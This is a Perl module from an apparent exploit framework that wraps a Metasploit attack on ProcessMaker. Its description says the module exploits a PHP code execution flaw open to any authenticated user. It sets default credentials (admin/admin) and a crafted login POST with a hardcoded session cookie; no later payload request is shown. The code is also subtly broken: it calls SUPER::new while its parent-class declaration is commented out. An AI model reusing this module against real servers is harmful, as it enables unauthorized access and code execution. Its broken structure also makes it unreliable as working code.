package MSFExploits::Exploits::PROCESSMAKER::MSF::ProcessmakerExec;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::PROCESSMAKER);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "ProcessmakerExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "DESCRIPTION" => "

        This module exploits a PHP code execution vulnerability in the

        'neoclassic' skin for ProcessMaker Open Source which allows any

        authenticated user to execute PHP code. The vulnerable skin is

        installed by default in version 2.x and cannot be removed via

        the web interface.

      ",
  "METHOD" => "POST",
  "MSF_MODULE" => "processmaker_exec",
  "OSVDB" => 99199,
  "REFERENCES" => ["http://bugs.processmaker.com/view.php?id=13436"],
  "THE USERTITLE FOR PROCESSMAKER" => "admin",
  VARIABLES => {
    'PASSWORD' =>       { DESCRIPTION => "The password for ProcessMaker", VALUE => "admin" },
    'WORKSPACE' =>       { DESCRIPTION => "The ProcessMaker workspace", VALUE => "workflow" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'sysworkflow/en/neoclassic/login/authentication.php',
      PAYLOAD      => 'form%5bUSR_PASSWORD%5d=__PASSWORD__&form%5bUSR_USERNAME%5d=__USERNAME__',
      TEXT   => 'Sending Exploit #1 Request : [POST] /sysworkflow/en/neoclassic/login/authentication.php',
      HEADERS      => {
        'Cookie' => 'PHPSESSID=HynW0s7a7EuW5T;',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
